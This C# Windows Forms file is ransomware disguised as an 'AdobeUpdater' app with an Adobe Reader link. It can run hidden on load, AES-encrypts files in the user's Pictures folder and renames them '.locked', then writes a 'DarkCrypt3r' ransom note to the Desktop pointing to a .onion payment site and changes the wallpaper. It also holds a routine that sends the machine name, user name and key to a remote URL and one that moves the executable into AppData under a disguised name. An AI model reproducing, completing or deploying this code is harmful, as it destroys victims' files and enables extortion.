using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace AdobeUpdater
{
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        private string targetURL = "https://www.example.com/";
        private readonly string wallpaperUrl = "https://sathisharthars.files.wordpress.com/2014/12/021e44da5addc20ffe5f09d9ec813f05.jpg";
        private readonly string userName = Environment.UserName;
        private readonly string computerName = System.Environment.MachineName;
        private bool formVisible = true;
        private string masterPassword = "topsecret";

        private readonly string[] fileExtensions =
        {
            ".txt",
            //".doc", ".docx", ".xls", ".index", ".pdf", ".zip", ".rar", ".css", ".lnk", ".xlsx", ".ppt", ".pptx",
            //".odt", ".jpg", ".bmp", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml",
            //".psd", ".bk", ".bat", ".mp3", ".mp4", ".wav", ".wma", ".avi", ".divx", ".mkv", ".mpeg", ".wmv", ".mov",
            //".ogg"
        };

        public Form1()
        {
            InitializeComponent();
        }

        public void Form1_Load(object sender, EventArgs e)
        {
            LinkLabel.Link link = new LinkLabel.Link {LinkData = "https://get.adobe.com/reader"};
            linkLabel1.Links.Add(link);

            if (formVisible == false)
            {
                Opacity = 0;
                this.ShowInTaskbar = false;

                //starts encryption at form load
                Run();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Run();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start(e.Link.LinkData.ToString());
        }

        private void Form_Shown(object sender, EventArgs e)
        {
            if (formVisible == false)
            {
                Visible = false;
                Opacity = 100;
            }
        }

        private void Run()
        {
            //MoveVirus();

            // C:\Users\JRN\AppData\Roaming\Microsoft\Windows\Libraries

            string[] paths = { Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) };

            var password = CreatePassword(15);
            
            while (CheckForInternetConnection() == false)
            {
                Thread.Sleep(2000);
            }

            // SendPassword();
            
            foreach (var path in paths)
            {
                LockFiles(path, masterPassword);
            }

            DropNote();

            masterPassword = null;
            System.Windows.Forms.Application.Exit();
        }

        //AES encryption algorithm
        private byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }


        //Encrypts single file
        private void Lock(string file, string password)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".locked");
        }

        private void LockFiles(string d, string p)
        {
            string[] aF = Directory.GetFiles(d, "*.*", SearchOption.AllDirectories)
                .Where(f => fileExtensions.Contains(Path.GetExtension(f))).ToArray();
            
            foreach (var s in aF)
            {
                try
                {
                    Lock(s, p);
                }
                catch
                {
                    // Nothing
                }
            }
        }

        //creates random password for encryption
        private string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Sends created password target location
        private void SendPassword(string password)
        {
            string info = computerName + "-" + userName + " " + password;
            var fullUrl = targetURL + info;

            try
            {
                var content = new System.Net.WebClient().DownloadString(fullUrl);
            }
            catch
            {
                // 
            }
        }

       

        //check for internet connection
        private static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("https://www.google.com"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        //create a random dir and move virus on it to avoid conflicts with encryption itself
        private void MoveVirus()
        {
            string folderName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Guid.NewGuid().ToString());
            string fileName = Path.Combine(folderName, "oemwinserv.exe");
            if (!Directory.Exists(folderName))
            {
                Directory.CreateDirectory(folderName);
            }
            else
            {
                if (File.Exists(fileName))
                {
                    File.Delete(fileName);
                }
            }
            string curFile = Path.Combine(Directory.GetCurrentDirectory(), Process.GetCurrentProcess().ProcessName, ".exe");
            string sourceFileName = curFile;
            File.Move(sourceFileName, fileName);
        }

        private void DropNote()
        {
            string fullpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "!how_to_unlock.txt");
            
            string[] logo = new[]
            {
                "                             ud$$$**$$$$$$$bc.                                  ",
                "                          u@**'        4$$$$$$$Nu                               ",
                "                        J                ''#$$$$$$r                             ",
                "                       @                       $$$$b                            ",
                "                     .F                        ^*3$$$                           ",
                "                    :% 4                         J$$$N                          ",
                "                    $  :F                       :$$$$$                          ",
                "                   4F  9                       J$$$$$$$                         ",
                "                   4$   k             4$$$$bed$$$$$$$$$                         ",
                "                   $$r  'F            $$$$$$$$$$$$$$$$$r                        ",
                "                   $$$   b.           $$$$$$$$$$$$$$$$$N                        ",
                "                   $$$$$k 3eeed$$b    $$$Euec.'$$$$$$$$$                        ",
                "    .@$**N.        $$$$$' $$$$$$F'L $$$$$$$$$$$  $$$$$$$                        ",
                "    :$$L  'L       $$$$$ 4$$$$$$  * $$$$$$$$$$F  $$$$$$F         edNc           ",
                "   @$$$$N  ^k      $$$$$  3$$$$*%   $F4$$$$$$$   $$$$$'        d'  z$N          ",
                "   $$$$$$   ^k     '$$$'   #$$$F   .$  $$$$$c.u@$$$          J'  @$$$$r         ",
                "   $$$$$$$b   *u    ^$L            $$  $$$$$$$$$$$$u@       $$  d$$$$$$         ",
                "    ^$$$$$$.    'NL   'N. z@*     $$$  $$$$$$$$$$$$$P      $P  d$$$$$$$         ",
                "       ^'*$$$$b   '*L   9$E      4$$$  d$$$$$$$$$$$'     d*   J$$$$$r           ",
                "            ^$$$$u  '$.  $$$L     '#' d$$$$$$'.@$$    .@$'  z$$$$*'             ",
                "              ^$$$$. ^$N.3$$$       4u$$$$$$$ 4$$$  u$*' z$$$'                  ",
                "                '*$$$$$$$$ *$b      J$$$$$$$b u$$P $'  d$$P                     ",
                "                   #$$$$$$ 4$ 3*$'$*$ $'$'c@@$$$$ .u@$$$P                       ",
                "                     '$$$$  ''F~$ $uNr$$$^&J$$$$F $$$$#                         ",
                "                       '$$    '$$$bd$.$W$$$$$$$$F $$'                           ",
                "                         ?k         ?$$$$$$$$$$$F'*                             ",
                "                          9$$bL     z$$$$$$$$$$$F                               ",
                "                           $$$$    $$$$$$$$$$$$$                                ",
                "                            '#$$c  '$$$$$$$$$'                                  ",
                "                             .@'#$$$$$$$$$$$$b                                  ",
                "                           z*      $$$$$$$$$$$$N.                               ",
                "                         e'      z$$'  #$$$k  '*$$.                             ",
                "                     .u*      u@$P'      '#$$c   '$$c                           ",
                "              u@$*'''       d$$'            '$$$u  ^*$$b.                       ",
                "            :$F           J$P'                ^$$$c   ''$$$$$$bL                ",
                "           d$$  ..      @$#                      #$$b         '#$               ",
                "           9$$$$$$b   4$$                          ^$$k         '$              ",
                "            '$$6''$b u$$                             '$    d$$$$$P              ",
                "              '$F $$$$$'                              ^b  ^$$$$b$               ",
                "               '$W$$$$'                                'b@$$$$'                 ",
                "                                                        ^$$$*                   ",
                "                                                                                ",
                "        DarkCrypt3r © By Muhaddi Haxor and a team of Pakistani Hackers          ",
                "                                                                                ",
                "********************************************************************************"
            };
            
            string[] lines =
            {
                "",
                "Oops! Your files have been encrypted.",
                "If you see this text, your files are no longer accessible.",
                "You might have been looking for a way to recover your files.",
                "Don't waste your time. No one will be able to recover them without our",
                "decryption service.",
                "",
                "We guarantee that you can recover all your files safely. All you ",
                "need to do is submit the payment and get the decryption password.",
                "",
                "Visit our web service at caforssztxqzf2nm.onion"
            };

            string[] note = new string[logo.Length + lines.Length];
            Array.Copy(logo, note, logo.Length);
            Array.Copy(lines, 0, note, logo.Length, lines.Length);

            File.WriteAllLines(fullpath, note);
            Wallpaper.Set(new Uri(wallpaperUrl), Wallpaper.Style.Stretched);
        }

      
    }
}